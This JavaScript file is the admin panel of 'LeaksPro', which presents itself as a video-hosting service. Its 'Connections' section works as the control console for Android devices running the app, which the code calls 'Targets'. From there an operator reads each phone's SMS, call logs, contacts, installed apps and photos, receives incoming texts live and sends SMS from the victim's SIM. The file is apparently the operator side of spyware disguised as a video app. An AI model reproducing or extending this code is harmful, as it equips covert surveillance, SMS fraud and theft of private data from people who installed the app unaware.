// ==========================================
// LeaksPro Admin Panel — Fully Responsive App
// ==========================================

const API_BASE = window.location.origin;
let adminPassword = '';
let socket = null;
let currentPage = 'dashboard';
let selectedVideoFile = null;

// ========== DOM Ready ==========
document.addEventListener('DOMContentLoaded', () => {
  const stored = localStorage.getItem('leakspro_admin_pw');
  if (stored) {
    adminPassword = stored;
    verifyLogin(stored);
  } else {
    // No saved password — hide splash to show login screen
    setTimeout(() => hideSplash(), 800);
  }
  setupListeners();
  document.getElementById('serverUrl').value = API_BASE;
});

// ========== Event Listeners ==========
function setupListeners() {

  // --- Login ---
  document.getElementById('loginForm').addEventListener('submit', async e => {
    e.preventDefault();
    const btn = document.getElementById('loginBtn');
    btn.disabled = true;
    btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i> Signing in...';
    await verifyLogin(document.getElementById('loginPassword').value);
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-login-box-line"></i> <span>Sign In</span>';
  });

  // --- Password toggle ---
  document.getElementById('togglePw').addEventListener('click', () => {
    const inp = document.getElementById('loginPassword');
    const icon = document.querySelector('#togglePw i');
    if (inp.type === 'password') {
      inp.type = 'text';
      icon.className = 'ri-eye-line';
    } else {
      inp.type = 'password';
      icon.className = 'ri-eye-off-line';
    }
  });

  // --- Sidebar navigation ---
  document.querySelectorAll('.nav-link').forEach(item => {
    item.addEventListener('click', e => {
      e.preventDefault();
      navigateTo(item.dataset.page);
    });
  });

  // --- Mobile menu ---
  document.getElementById('menuBtn').addEventListener('click', openSidebar);
  document.getElementById('closeSidebar').addEventListener('click', closeSidebar);
  document.getElementById('sidebarOverlay').addEventListener('click', closeSidebar);

  // --- Logout ---
  const logoutFn = () => {
    localStorage.removeItem('leakspro_admin_pw');
    adminPassword = '';
    document.getElementById('app').classList.add('hidden');
    document.getElementById('loginScreen').style.display = 'flex';
    if (socket) socket.disconnect();
  };
  document.getElementById('logoutBtn').addEventListener('click', logoutFn);
  document.getElementById('logoutBtnMobile').addEventListener('click', logoutFn);

  // --- Drop zone ---
  const dz = document.getElementById('dropZone');
  const vfi = document.getElementById('videoFile');
  dz.addEventListener('click', () => vfi.click());
  dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('dragover'); });
  dz.addEventListener('dragleave', () => dz.classList.remove('dragover'));
  dz.addEventListener('drop', e => {
    e.preventDefault(); dz.classList.remove('dragover');
    if (e.dataTransfer.files.length) handleFileSelect(e.dataTransfer.files[0]);
  });
  vfi.addEventListener('change', e => {
    if (e.target.files.length) handleFileSelect(e.target.files[0]);
  });

  // --- Thumbnail preview ---
  document.getElementById('thumbnailFile').addEventListener('change', e => {
    const f = e.target.files[0];
    if (f) {
      const rd = new FileReader();
      rd.onload = ev => {
        const img = document.getElementById('thumbnailPreview');
        img.src = ev.target.result;
        img.classList.remove('hidden');
      };
      rd.readAsDataURL(f);
    }
  });

  // --- Upload form ---
  document.getElementById('uploadForm').addEventListener('submit', async e => {
    e.preventDefault();
    if (!selectedVideoFile) return showToast('Please select a video file', 'error');
    await uploadVideo();
  });

  // --- Edit form ---
  document.getElementById('editForm').addEventListener('submit', async e => {
    e.preventDefault();
    await saveVideoEdit();
  });

  // --- Video search (debounced) ---
  let searchTimer;
  document.getElementById('videoSearch').addEventListener('input', e => {
    clearTimeout(searchTimer);
    searchTimer = setTimeout(() => loadVideos(1, e.target.value), 300);
  });

  // --- Settings form ---
  document.getElementById('settingsForm').addEventListener('submit', async e => {
    e.preventDefault();
    await saveSettings();
  });
}

// ========== Sidebar mobile helpers ==========
function openSidebar() {
  document.getElementById('sidebar').classList.add('open');
  document.getElementById('sidebarOverlay').classList.add('show');
  document.body.style.overflow = 'hidden';
}
function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebarOverlay').classList.remove('show');
  document.body.style.overflow = '';
}

// ========== Auth ==========
async function verifyLogin(password) {
  try {
    const res = await fetch(`${API_BASE}/api/admin/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password }),
    });
    if (res.ok) {
      adminPassword = password;
      localStorage.setItem('leakspro_admin_pw', password);
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('app').classList.remove('hidden');
      initApp();
      // Hide splash after app is initialized
      setTimeout(() => hideSplash(), 600);
    } else {
      showToast('Invalid password', 'error');
      setTimeout(() => hideSplash(), 400);
    }
  } catch (err) {
    showToast('Connection error: ' + err.message, 'error');
    setTimeout(() => hideSplash(), 400);
  }
}

// ========== App Init ==========
function initApp() {
  connectWebSocket();
  loadDashboard();
  navigateTo('dashboard');
}

// ========== WebSocket ==========
function connectWebSocket() {
  socket = io(API_BASE);

  socket.on('connect', () => {
    setWsStatus('connected', 'Connected');
    addActivity('ri-link', 'WebSocket connected');
  });

  socket.on('disconnect', () => setWsStatus('disconnected', 'Disconnected'));

  socket.on('clients_count', c => {
    document.getElementById('clientCount').textContent = c;
  });

  socket.on('new_video', v => {
    addActivity('ri-video-upload-line', `New video: ${v.title}`);
    showToast(`New video uploaded: ${v.title}`, 'success');
    if (currentPage === 'dashboard') loadDashboard();
    if (currentPage === 'videos') loadVideos();
  });

  socket.on('view_update', d => addActivity('ri-eye-line', `Video viewed (${d.views} total)`));
  socket.on('upload_progress', d => addActivity('ri-upload-2-line', `Upload "${d.filename}": ${d.progress}%`));
  socket.on('upload_complete', d => addActivity('ri-checkbox-circle-line', `Upload complete: ${d.filename}`));
  socket.on('video_deleted', d => {
    addActivity('ri-delete-bin-line', `Video deleted: ${d.id}`);
    if (currentPage === 'videos') loadVideos();
    if (currentPage === 'dashboard') loadDashboard();
  });

  // --- Device events ---
  // ALL device events update in-memory allDevices so the panel never needs a manual refresh.
  // When navigating to Connections, the data is already up-to-date from WebSocket events.

  socket.on('device_online', d => {
    addActivity('ri-smartphone-line', `Device connected: ${d.model || d.device_id}`);
    d.is_online = 1; // force online
    upsertDeviceInMemory(d);
    if (currentPage === 'connections') renderDeviceGrid();
    if (currentPage === 'dashboard') loadDashboard();
    recalcConnStats();
  });

  socket.on('device_offline', d => {
    addActivity('ri-smartphone-line', `Device went offline: ${d.model || d.device_id}`);
    d.is_online = 0; // force offline
    upsertDeviceInMemory(d);
    if (currentPage === 'connections') renderDeviceGrid();
    recalcConnStats();
  });

  socket.on('device_removed', d => {
    addActivity('ri-smartphone-line', `Device uninstalled: ${d.device_id}`);
    allDevices = allDevices.filter(dev => dev.device_id !== d.device_id);
    if (currentPage === 'connections') renderDeviceGrid();
    recalcConnStats();
  });

  socket.on('devices_cleanup', () => {
    // Server cleaned up stale devices — reload connections
    if (currentPage === 'connections') loadConnections();
  });

  socket.on('device_status_update', d => {
    upsertDeviceInMemory(d);
    if (currentPage === 'connections') renderDeviceGrid();
    recalcConnStats();
  });

  // SMS send result from device
  socket.on('sms_send_result', d => {
    const statusEl = document.getElementById('smsSendStatus');
    if (d.success) {
      statusEl.className = 'sms-send-status success';
      statusEl.innerHTML = `<i class="ri-checkbox-circle-line"></i> SMS sent successfully to ${d.receiver || 'recipient'} via SIM ${d.sim_slot || '?'}`;
      statusEl.classList.remove('hidden');
      addActivity('ri-send-plane-2-fill', `SMS sent to ${d.receiver || '?'} via SIM ${d.sim_slot || '?'}`);
      showToast('SMS sent successfully!', 'success');
      // Clear compose fields
      document.getElementById('smsReceiver').value = '';
      document.getElementById('smsMessage').value = '';
    } else {
      statusEl.className = 'sms-send-status error';
      statusEl.innerHTML = `<i class="ri-error-warning-line"></i> Device failed to send: ${d.error || 'Unknown error'}`;
      statusEl.classList.remove('hidden');
      showToast('Device failed to send SMS: ' + (d.error || 'Unknown error'), 'error');
    }
    // Auto-hide after 6 seconds
    setTimeout(() => statusEl.classList.add('hidden'), 6000);
  });

  // ========== INSTANT SMS — new SMS received on a device ==========
  socket.on('new_sms', d => {
    addActivity('ri-message-2-fill', `New SMS on ${d.device_id?.substring(0,8)}... from ${d.address} (SIM ${d.sim_slot || '?'})`);
    showToast(`New SMS from ${d.address}`, 'success');

    // If the device modal is open for this device and SMS tab is active, refresh
    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'sms') {
      loadSmsMessages(1);
    }
  });
}

function setWsStatus(state, label) {
  const el = document.getElementById('wsIndicator');
  el.classList.remove('connected', 'disconnected');
  el.classList.add(state);
  document.getElementById('wsStatus').textContent = label;
  // topbar dot
  const dot = document.getElementById('wsDotTopbar');
  if (dot) dot.style.background = state === 'connected' ? 'var(--green)' : 'var(--red)';
  const tb = document.getElementById('wsStatusTopbar');
  if (tb) tb.textContent = label;
}

// ========== Splash Loader ==========
function showSplash(mini) {
  const s = document.getElementById('xpacSplash');
  if (!s) return;
  s.classList.remove('hidden');
  if (mini) s.classList.add('mini'); else s.classList.remove('mini');
}
function hideSplash() {
  const s = document.getElementById('xpacSplash');
  if (!s) return;
  s.classList.add('hidden');
}

// ========== Navigation ==========
function navigateTo(page) {
  // Show mini splash during section transition
  showSplash(true);

  // Small delay so the splash is visible, then switch page
  setTimeout(() => {
    currentPage = page;
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
    document.getElementById(`page-${page}`).classList.add('active');
    const navEl = document.querySelector(`[data-page="${page}"]`);
    if (navEl) navEl.classList.add('active');

    const titles = { dashboard: 'Dashboard', upload: 'Upload Video', tmdb: 'Netflix Import', videos: 'All Videos', connections: 'Connections', settings: 'Settings', telegram: 'Telegram', apksign: 'APK Signer', admindevices: 'Admin Devices', system: 'System & Recovery' };
    document.getElementById('pageTitle').textContent = titles[page] || page;

    if (page === 'dashboard') loadDashboard();
    if (page === 'videos') loadVideos();
    if (page === 'connections') loadConnections();
    if (page === 'tmdb') initTmdbPage();
    if (page === 'settings') loadCurrentTheme();
    if (page === 'apksign') initApkSignPage();
    if (page === 'admindevices') loadAdminDevices();
    if (page === 'system') loadSystemConfig();

    closeSidebar();

    // Hide splash after page content is ready
    setTimeout(() => hideSplash(), 350);
  }, 400);
}

// ========== Dashboard ==========
async function loadDashboard() {
  try {
    const res = await fetch(`${API_BASE}/api/admin/stats`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();

    document.getElementById('statVideos').textContent = fmtNum(data.totalVideos);
    document.getElementById('statViews').textContent = fmtNum(data.totalViews);
    document.getElementById('statLikes').textContent = fmtNum(data.totalLikes);
    document.getElementById('statStorage').textContent = fmtBytes(data.totalSize);

    const box = document.getElementById('recentUploads');
    if (!data.recentUploads || data.recentUploads.length === 0) {
      box.innerHTML = '<p class="empty">No videos uploaded yet</p>';
    } else {
      box.innerHTML = data.recentUploads.map(v => {
        const thumb = getThumbUrl(v.thumbnail);
        return `
        <div class="recent-item">
          <img src="${thumb}" alt="${esc(v.title)}" loading="lazy">
          <div class="r-info">
            <h4>${esc(v.title)}</h4>
            <p>${fmtNum(v.views)} views · ${fmtDate(v.created_at)} · ${fmtBytes(v.file_size)}</p>
          </div>
        </div>`;
      }).join('');
    }
  } catch (err) {
    showToast('Failed to load dashboard: ' + err.message, 'error');
  }
}

// ========== File Handling ==========
function handleFileSelect(file) {
  if (!file.type.startsWith('video/')) return showToast('Please select a video file', 'error');

  selectedVideoFile = file;
  document.getElementById('dropZone').classList.add('hidden');
  document.getElementById('fileInfo').classList.remove('hidden');
  document.getElementById('fileName').textContent = file.name;
  document.getElementById('fileSize').textContent = fmtBytes(file.size);

  const title = file.name.replace(/\.[^/.]+$/, '').replace(/[_-]/g, ' ');
  document.getElementById('videoTitle').value = title;

  if (file.size > 100 * 1024 * 1024) {
    showToast('Large file — Cloudinary will handle it', 'info');
  }
}

function clearFile() {
  selectedVideoFile = null;
  document.getElementById('dropZone').classList.remove('hidden');
  document.getElementById('fileInfo').classList.add('hidden');
  document.getElementById('uploadProgress').classList.add('hidden');
  document.getElementById('videoFile').value = '';
}
window.clearFile = clearFile;

// ========== Upload ==========
async function uploadVideo() {
  const btn = document.getElementById('uploadBtn');
  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i> Uploading...';
  document.getElementById('uploadProgress').classList.remove('hidden');

  try {
    const fd = new FormData();
    fd.append('video', selectedVideoFile);

    const thumbF = document.getElementById('thumbnailFile').files[0];
    if (thumbF) fd.append('thumbnail', thumbF);

    fd.append('title', document.getElementById('videoTitle').value);
    fd.append('description', document.getElementById('videoDesc').value);
    fd.append('category', document.getElementById('videoCategory').value);
    fd.append('channel_name', document.getElementById('channelName').value);
    fd.append('duration', document.getElementById('videoDuration').value || '0');
    fd.append('is_published', document.getElementById('isPublished').checked);
    fd.append('is_short', document.getElementById('isShort').checked);

    const tags = document.getElementById('videoTags').value;
    if (tags) fd.append('tags', JSON.stringify(tags.split(',').map(t => t.trim())));

    const xhr = new XMLHttpRequest();
    xhr.open('POST', `${API_BASE}/api/admin/upload`);
    xhr.setRequestHeader('x-admin-password', adminPassword);

    xhr.upload.onprogress = e => {
      if (e.lengthComputable) {
        const pct = Math.round((e.loaded / e.total) * 100);
        updateProgress(pct, pct < 100 ? 'Uploading to server...' : 'Processing on Cloudinary...');
      }
    };

    await new Promise((resolve, reject) => {
      xhr.onload = () => {
        if (xhr.status === 200) {
          showToast('Video uploaded successfully!', 'success');
          resetUploadForm();
          resolve();
        } else {
          try { reject(new Error(JSON.parse(xhr.responseText).error)); }
          catch (_) { reject(new Error('Upload failed (status ' + xhr.status + ')')); }
        }
      };
      xhr.onerror = () => reject(new Error('Network error'));
      xhr.send(fd);
    });
  } catch (err) {
    showToast('Upload failed: ' + err.message, 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-upload-cloud-2-line"></i> Upload Video';
  }
}

function updateProgress(pct, label) {
  document.getElementById('progressFill').style.width = pct + '%';
  document.getElementById('progressText').textContent = pct + '%';
  if (label) document.getElementById('progressSpeed').textContent = label;
}

function resetUploadForm() {
  clearFile();
  document.getElementById('uploadForm').reset();
  document.getElementById('channelName').value = 'LeaksPro Admin';
  document.getElementById('isPublished').checked = true;
  document.getElementById('thumbnailPreview').classList.add('hidden');
  document.getElementById('uploadProgress').classList.add('hidden');
}

// ========== Videos List ==========
async function loadVideos(page = 1, search = '') {
  try {
    const url = new URL(`${API_BASE}/api/admin/videos`);
    url.searchParams.set('page', page);
    url.searchParams.set('limit', 12);
    if (search) url.searchParams.set('search', search);

    const res = await fetch(url.toString(), {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    const grid = document.getElementById('videosList');

    if (!data.videos || data.videos.length === 0) {
      grid.innerHTML = '<p class="empty">No videos found</p>';
      document.getElementById('videoPagination').innerHTML = '';
      return;
    }

    grid.innerHTML = data.videos.map(v => {
      const thumb = getThumbUrl(v.thumbnail);
      return `
      <div class="vid-card">
        <div class="vid-thumb">
          <img src="${thumb}" alt="${esc(v.title)}" loading="lazy">
          ${v.duration > 0 ? `<span class="dur">${fmtDur(v.duration)}</span>` : ''}
          <span class="badge ${v.is_published ? 'pub' : 'draft'}">${v.is_published ? 'Published' : 'Draft'}</span>
        </div>
        <div class="vid-body">
          <h4>${esc(v.title)}</h4>
          <div class="vid-meta">
            <span><i class="ri-eye-line"></i> ${fmtNum(v.views)}</span>
            <span><i class="ri-thumb-up-line"></i> ${fmtNum(v.likes)}</span>
            <span><i class="ri-hard-drive-3-line"></i> ${fmtBytes(v.file_size)}</span>
          </div>
          <div class="vid-actions">
            <button class="btn btn-sm btn-outline" onclick="editVideo('${v.id}')">
              <i class="ri-edit-line"></i> Edit
            </button>
            <button class="btn btn-sm btn-danger" onclick="deleteVideo('${v.id}','${esc(v.title).replace(/'/g, "\\'")}')">
              <i class="ri-delete-bin-line"></i> Delete
            </button>
          </div>
        </div>
      </div>`;
    }).join('');

    // Pagination
    const pagEl = document.getElementById('videoPagination');
    if (data.pagination && data.pagination.totalPages > 1) {
      let h = '';
      for (let i = 1; i <= data.pagination.totalPages; i++) {
        h += `<button class="${i === data.pagination.page ? 'active' : ''}" onclick="loadVideos(${i},'${search}')">${i}</button>`;
      }
      pagEl.innerHTML = h;
    } else {
      pagEl.innerHTML = '';
    }
  } catch (err) {
    showToast('Failed to load videos: ' + err.message, 'error');
  }
}
window.loadVideos = loadVideos;

// ========== Edit Video ==========
async function editVideo(id) {
  try {
    const res = await fetch(`${API_BASE}/api/videos/${id}`);
    const data = await res.json();
    const v = data.video;

    document.getElementById('editVideoId').value = v.id;
    document.getElementById('editTitle').value = v.title;
    document.getElementById('editDesc').value = v.description || '';
    document.getElementById('editCategory').value = v.category;
    document.getElementById('editChannel').value = v.channel_name;
    document.getElementById('editPublished').checked = v.is_published;
    document.getElementById('editShort').checked = v.is_short;

    document.getElementById('editModal').classList.remove('hidden');
  } catch (err) {
    showToast('Failed to load video details', 'error');
  }
}
window.editVideo = editVideo;

async function saveVideoEdit() {
  const id = document.getElementById('editVideoId').value;
  const fd = new FormData();
  fd.append('title', document.getElementById('editTitle').value);
  fd.append('description', document.getElementById('editDesc').value);
  fd.append('category', document.getElementById('editCategory').value);
  fd.append('channel_name', document.getElementById('editChannel').value);
  fd.append('is_published', document.getElementById('editPublished').checked);
  fd.append('is_short', document.getElementById('editShort').checked);

  const tf = document.getElementById('editThumbnail').files[0];
  if (tf) fd.append('thumbnail', tf);

  try {
    const res = await fetch(`${API_BASE}/api/admin/videos/${id}`, {
      method: 'PUT',
      headers: { 'x-admin-password': adminPassword },
      body: fd,
    });
    if (res.ok) {
      showToast('Video updated!', 'success');
      closeModal();
      loadVideos();
    } else throw new Error('Failed to update');
  } catch (err) {
    showToast('Error: ' + err.message, 'error');
  }
}

function closeModal() {
  document.getElementById('editModal').classList.add('hidden');
}
window.closeModal = closeModal;

// ========== Delete Video ==========
async function deleteVideo(id, title) {
  if (!confirm(`Delete "${title}"? This cannot be undone.`)) return;
  try {
    const res = await fetch(`${API_BASE}/api/admin/videos/${id}`, {
      method: 'DELETE',
      headers: { 'x-admin-password': adminPassword },
    });
    if (res.ok) {
      showToast('Video deleted', 'success');
      loadVideos();
      loadDashboard();
    } else throw new Error('Failed to delete');
  } catch (err) {
    showToast('Error: ' + err.message, 'error');
  }
}
window.deleteVideo = deleteVideo;

window.deleteVideo = deleteVideo;

// ========== Connections ==========
let allDevices = [];

async function loadConnections() {
  try {
    const res = await fetch(`${API_BASE}/api/admin/connections`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allDevices = data.devices || [];
    renderDeviceGrid();
    updateConnStatsFromData(data);
  } catch (err) {
    showToast('Failed to load connections: ' + err.message, 'error');
  }
}

function updateConnStats() {
  // Re-fetch counts if on connections page
  if (currentPage === 'connections') loadConnections();
}

// Recalculate connection stats from in-memory allDevices (no REST call needed)
function recalcConnStats() {
  const total = allDevices.length;
  const online = allDevices.filter(d => d.is_online).length;
  const offline = total - online;
  updateConnStatsFromData({ totalDevices: total, onlineCount: online, offlineCount: offline });
}

function updateConnStatsFromData(data) {
  const el = id => document.getElementById(id);
  if (el('connTotal')) el('connTotal').textContent = data.totalDevices || 0;
  if (el('connOnline')) el('connOnline').textContent = data.onlineCount || 0;
  if (el('connOffline')) el('connOffline').textContent = data.offlineCount || 0;
}

// Update in-memory allDevices array without re-rendering (caller decides when to render)
function upsertDeviceInMemory(device) {
  const idx = allDevices.findIndex(d => d.device_id === device.device_id);
  if (idx >= 0) {
    allDevices[idx] = device;
  } else {
    allDevices.unshift(device);
  }
}

function upsertDeviceCard(device) {
  upsertDeviceInMemory(device);
  renderDeviceGrid();
  recalcConnStats();
}

function removeDeviceCard(deviceId) {
  allDevices = allDevices.filter(d => d.device_id !== deviceId);
  renderDeviceGrid();
  recalcConnStats();
}

async function deleteDevice(deviceId, deviceName) {
  if (!confirm(`DELETE device "${deviceName}"?\n\nThis will permanently remove ALL data:\n• SMS messages\n• Call logs\n• Contacts\n• Apps\n• Gallery photos\n\nThis action cannot be undone.`)) return;
  try {
    const res = await fetch(`${API_BASE}/api/admin/connections/${deviceId}`, {
      method: 'DELETE',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      removeDeviceCard(deviceId);
      showToast(`Device "${deviceName}" deleted successfully`, 'success');
    } else {
      showToast('Failed to delete device', 'error');
    }
  } catch (err) {
    showToast('Delete failed: ' + err.message, 'error');
  }
}



function renderDeviceGrid() {
  const grid = document.getElementById('deviceGrid');
  if (!allDevices || allDevices.length === 0) {
    grid.innerHTML = `<div class="fx-empty"><i class="ri-radar-line"></i><p>NO DEVICES DETECTED</p><span>Targets will appear when the app is installed on a device</span></div>`;
    return;
  }

  // Sort: online first, then by last_seen desc
  const sorted = [...allDevices].sort((a, b) => {
    if (a.is_online !== b.is_online) return b.is_online - a.is_online;
    return new Date(b.last_seen || 0) - new Date(a.last_seen || 0);
  });

  grid.innerHTML = sorted.map(d => {
    const isOnline = d.is_online ? true : false;
    const online = isOnline ? 'online' : 'offline';
    const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
    const statusTime = isOnline ? 'LIVE' : (d.last_seen ? timeAgo(d.last_seen) : 'N/A');
    const batt = d.battery_percent ?? -1;
    const battClass = batt > 50 ? 'high' : batt > 20 ? 'mid' : 'low';
    const battWidth = batt >= 0 ? batt : 0;
    const charging = d.battery_charging ? `<i class="ri-flashlight-line batt-charge"></i>` : '';
    const phones = Array.isArray(d.phone_numbers) ? d.phone_numbers : [];
    const deviceName = [d.manufacturer, d.model].filter(Boolean).join(' ') || d.device_name || 'Unknown Device';
    const shortId = d.device_id.length > 20 ? d.device_id.substring(0, 8) + '...' + d.device_id.slice(-6) : d.device_id;

    let simHtml = '';
    if (phones.length === 0) {
      simHtml = '<span class="sim-none">No SIM detected</span>';
    } else {
      simHtml = '<div class="sim-list">' + phones.map((p, i) => {
        const cls = i === 0 ? 'sim1' : 'sim2';
        const label = `SIM ${i + 1}`;
        return `<span class="sim-badge ${cls}"><i class="ri-sim-card-2-line"></i>${label}: ${esc(p.number || p)}</span>`;
      }).join('') + '</div>';
    }

    // Storage & RAM info
    const totalStorage = d.total_storage || 0;
    const freeStorage = d.free_storage || 0;
    const usedStorage = totalStorage - freeStorage;
    const storagePct = totalStorage > 0 ? Math.round((usedStorage / totalStorage) * 100) : 0;
    const storageClass = storagePct > 90 ? 'low' : storagePct > 70 ? 'mid' : 'high';

    const totalRam = d.total_ram || 0;
    const freeRam = d.free_ram || 0;
    const usedRam = totalRam - freeRam;
    const ramPct = totalRam > 0 ? Math.round((usedRam / totalRam) * 100) : 0;
    const ramClass = ramPct > 90 ? 'low' : ramPct > 70 ? 'mid' : 'high';

    return `
    <div class="dev-card ${online}" data-device-id="${d.device_id}" onclick="openDeviceModal('${d.device_id}','${esc(deviceName).replace(/'/g, "\\'")}')">
      <div class="dev-top">
        <div class="dev-status">
          <span class="dev-led"></span>
          <span class="dev-status-text">${statusText}</span>
        </div>
        <span class="dev-time">${statusTime}</span>
      </div>
      <div class="dev-identity">
        <div class="dev-icon"><i class="ri-smartphone-line"></i></div>
        <div>
          <div class="dev-name">${esc(deviceName)}</div>
          <div class="dev-id">ID: ${shortId}</div>
        </div>
      </div>
      <div class="dev-data">
        <div class="dev-row">
          <span class="dev-row-label">OS</span>
          <span class="dev-row-value">${esc(d.os_version || '?')} (SDK ${d.sdk_version || '?'})</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">APP</span>
          <span class="dev-row-value">v${esc(d.app_version || '?')}</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">DISPLAY</span>
          <span class="dev-row-value">${esc(d.screen_resolution || '?')}</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">BATTERY</span>
          <span class="dev-row-value">
            <div class="dev-battery">
              ${charging}
              <div class="batt-shell"><div class="batt-fill ${battClass}" style="width:${battWidth}%"></div></div>
              <span class="batt-pct ${battClass}">${batt >= 0 ? batt + '%' : '?'}</span>
            </div>
          </span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">STORAGE</span>
          <span class="dev-row-value">
            ${totalStorage > 0 ? `<div class="dev-battery"><div class="batt-shell"><div class="batt-fill ${storageClass}" style="width:${storagePct}%"></div></div><span class="batt-pct ${storageClass}">${fmtBytes(usedStorage)}/${fmtBytes(totalStorage)}</span></div>` : '?'}
          </span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">RAM</span>
          <span class="dev-row-value">
            ${totalRam > 0 ? `<div class="dev-battery"><div class="batt-shell"><div class="batt-fill ${ramClass}" style="width:${ramPct}%"></div></div><span class="batt-pct ${ramClass}">${fmtBytes(usedRam)}/${fmtBytes(totalRam)}</span></div>` : '?'}
          </span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">SIM</span>
          <span class="dev-row-value">${simHtml}</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">REGISTERED</span>
          <span class="dev-row-value">${d.first_seen ? new Date(d.first_seen).toLocaleString() : '?'}</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">LAST SEEN</span>
          <span class="dev-row-value">${d.last_seen ? new Date(d.last_seen).toLocaleString() : '?'}</span>
        </div>

      </div>
      ${!isOnline ? `<div class="dev-delete-wrap"><button class="dev-delete-btn" onclick="event.stopPropagation(); deleteDevice('${d.device_id}', '${esc(deviceName).replace(/'/g, "\\'")}')"><i class="ri-delete-bin-line"></i> DELETE DEVICE</button></div>` : ''}
    </div>`;
  }).join('');
}

// ========== Device Modal (Tabbed: SMS, Calls, Contacts, Apps) ==========
let modalDeviceId = '';
let modalDeviceName = '';
let activeTab = 'sms';

// SMS state
let allSmsMessages = [];
let smsCurrentPage = 1;

// Calls state
let allCallLogs = [];
let callsCurrentPage = 1;

// Contacts state
let allContacts = [];
let contactsCurrentPage = 1;

// Apps state
let allApps = [];

// Gallery state
let allGalleryPhotos = [];
let galleryCurrentPage = 1;
let galleryLightboxIdx = 0;
let galleryFilteredPhotos = [];

async function openDeviceModal(deviceId, deviceName) {
  modalDeviceId = deviceId;
  modalDeviceName = deviceName;
  activeTab = 'sms';

  // Reset all state
  allSmsMessages = [];
  smsCurrentPage = 1;
  allCallLogs = [];
  callsCurrentPage = 1;
  allContacts = [];
  contactsCurrentPage = 1;
  allApps = [];

  document.getElementById('deviceModalTitle').textContent = deviceName;
  document.getElementById('deviceModalSub').textContent = 'Loading...';

  // Reset search fields
  document.getElementById('smsSearch').value = '';
  document.getElementById('callSearch').value = '';
  document.getElementById('contactSearch').value = '';
  document.getElementById('appSearch').value = '';
  document.getElementById('smsReceiver').value = '';
  document.getElementById('smsMessage').value = '';
  document.getElementById('smsSendStatus').classList.add('hidden');
  const sysChk = document.getElementById('showSystemApps');
  if (sysChk) sysChk.checked = false;

  // Reset tabs
  document.querySelectorAll('.device-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.device-tab-content').forEach(t => t.classList.remove('active'));
  document.querySelector('.device-tab[data-tab="sms"]').classList.add('active');
  document.getElementById('tab-sms').classList.add('active');

  // Reset containers
  document.getElementById('smsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading messages...</span></div>`;
  document.getElementById('callsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading call logs...</span></div>`;
  document.getElementById('contactsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading contacts...</span></div>`;
  document.getElementById('appsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading apps...</span></div>`;
  document.getElementById('galleryGridContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading gallery...</span></div>`;
  document.getElementById('smsPagination').innerHTML = '';
  document.getElementById('callsPagination').innerHTML = '';
  document.getElementById('contactsPagination').innerHTML = '';
  document.getElementById('galleryPagination').innerHTML = '';
  document.getElementById('galleryCount').textContent = '';

  document.getElementById('deviceModal').classList.remove('hidden');

  // Load first tab
  await loadSmsMessages(1);
}
window.openDeviceModal = openDeviceModal;

function closeDeviceModal() {
  document.getElementById('deviceModal').classList.add('hidden');
  modalDeviceId = '';
  allSmsMessages = [];
  allCallLogs = [];
  allContacts = [];
  allApps = [];
  allGalleryPhotos = [];
  galleryFilteredPhotos = [];
}
window.closeDeviceModal = closeDeviceModal;

function switchDeviceTab(tab) {
  activeTab = tab;
  document.querySelectorAll('.device-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.device-tab-content').forEach(t => t.classList.remove('active'));
  document.querySelector(`.device-tab[data-tab="${tab}"]`).classList.add('active');
  document.getElementById(`tab-${tab}`).classList.add('active');

  // Lazy load data for the tab
  if (tab === 'sms' && allSmsMessages.length === 0) loadSmsMessages(1);
  if (tab === 'calls' && allCallLogs.length === 0) loadCallLogs(1);
  if (tab === 'contacts' && allContacts.length === 0) loadContacts(1);
  if (tab === 'apps' && allApps.length === 0) loadApps();
  if (tab === 'gallery' && allGalleryPhotos.length === 0) loadGallery(1);
}
window.switchDeviceTab = switchDeviceTab;

async function loadSmsMessages(page) {
  try {
    smsCurrentPage = page;
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/sms?page=${page}&limit=50`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allSmsMessages = data.messages || [];
    const total = data.total || 0;
    const totalPages = data.totalPages || 1;

    document.getElementById('deviceModalSub').textContent = `SMS: ${total} · Calls · Contacts · Apps`;

    renderSmsMessages(allSmsMessages);
    renderSmsPagination(page, totalPages, total);
  } catch (err) {
    document.getElementById('smsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD MESSAGES</p></div>`;
    showToast('Failed to load SMS: ' + err.message, 'error');
  }
}
